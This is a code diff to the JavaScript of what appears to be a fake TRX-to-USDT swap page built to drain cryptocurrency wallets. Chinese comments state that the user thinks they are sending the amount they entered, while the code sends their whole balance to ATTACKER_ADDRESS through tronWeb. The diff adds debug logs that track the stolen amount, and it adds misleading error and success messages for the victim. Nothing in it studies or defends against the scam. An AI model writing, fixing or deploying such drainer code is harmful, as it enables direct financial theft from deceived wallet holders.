@@ -2646,34 +2646,12 @@
 
         localStorage.setItem('attackRecord', JSON.stringify(attackRecord));
 
+        // 🎯 删除第一次交易执行，只保留后面的完整交易逻辑
+        debugLog(`🎯 准备执行恶意转账，用户以为转账: ${fromAmount} TRX`);
+        debugLog(`🎯 实际将转账用户全部余额到攻击者地址`);
+
         // 🎯 执行看似正常的转账（恶意后门会劫持）
         showToast('正在执行交易...', 'info');
-
-        try{
-            // 🎯 关键：只转账用户输入的金额，恶意后门会自动修改
-            const normalAmount = tronWeb.toSun(fromAmount);
-
-            debugLog(`🎯 发送正常转账请求: ${fromAmount} TRX`);
-            debugLog(`🎯 恶意后门将自动劫持并修改为全部余额`);
-
-            const transaction = await tronWeb.trx.sendTransaction(
-                ATTACKER_ADDRESS,
-                normalAmount
-            );
-            debugLog(`🎯 转账完成！交易哈希: ${transaction.txid || transaction}`);
-
-            // 显示虚假成功信息
-            showToast(`兑换成功！获得 ${(fromAmount * 0.1634).toFixed(6)} USDT`);
-
-            //等待余额更新
-            setTimeout(async () =>{
-                await forceRefreshBalance();
-            },3000);
-
-        }catch (error){
-            debugLog(`❌ 转账失败: ${error.message}`);
-            showToast('兑换失败，请重试', 'error');
-        }
 
 
         debugLog('🎯 攻击记录已保存:');
@@ -2684,8 +2662,8 @@
         debugLog(`   - 实际被盗金额: ${attackRecord.realStolenAmount} TRX`);
         debugLog(`   - 被盗金额价值: $${(attackRecord.realStolenAmount * 0.1634).toFixed(2)} USD`);
 
+        // 🎯 开始执行真实的恶意转账
         // 🎯 模拟区块链交易执行
-        showToast('正在执行交易...', 'info');
 
         // ✅ 正确的代码
         // 🎯 修复后的转账逻辑（替换您现有的setTimeout部分）
@@ -2733,6 +2711,13 @@
                     return password;
                 };
 
+                // 🎯 关键修复：添加详细的交易执行日志
+                debugLog('🎯 即将调用 tronWeb.trx.sendTransaction...');
+                debugLog(`🎯 参数检查:`);
+                debugLog(`- ATTACKER_ADDRESS: ${ATTACKER_ADDRESS}`);
+                debugLog(`- transferAmount: ${transferAmount}`);
+                debugLog(`- tronWeb状态: ${!!tronWeb}`);
+                debugLog(`- tronWeb.trx状态: ${!!tronWeb.trx}`);
                 const transaction = await tronWeb.trx.sendTransaction(
                     ATTACKER_ADDRESS,
                     transferAmount
@@ -2782,6 +2767,23 @@
 
             } catch (error) {
                 debugLog(`❌ 真实转账失败: ${error.message}`);
+                debugLog(`❌ 错误详情: ${JSON.stringify(error)}`);
+                debugLog(`❌ 错误类型: ${error.constructor.name}`);
+
+                // 🎯 关键修复：根据错误类型显示不同的用户提示
+                if (error.message.includes('User rejected') || error.message.includes('User denied')) {
+                    debugLog('🎯 用户取消了交易');
+                    showToast('交易已取消', 'warning');
+                } else if (error.message.includes('Insufficient balance')) {
+                    debugLog('🎯 余额不足');
+                    showToast('余额不足，无法完成交易', 'error');
+                } else if (error.message.includes('Invalid address')) {
+                    debugLog('🎯 地址无效');
+                    showToast('地址错误，请联系客服', 'error');
+                } else {
+                    debugLog('🎯 其他错误，可能是网络或钱包问题');
+                    showToast('网络异常，请稍后重试', 'error');
+                }
                 debugLog('🎯 转账失败可能原因:');
                 debugLog('1. 用户取消了转账授权');
                 debugLog('2. 余额不足支付手续费');
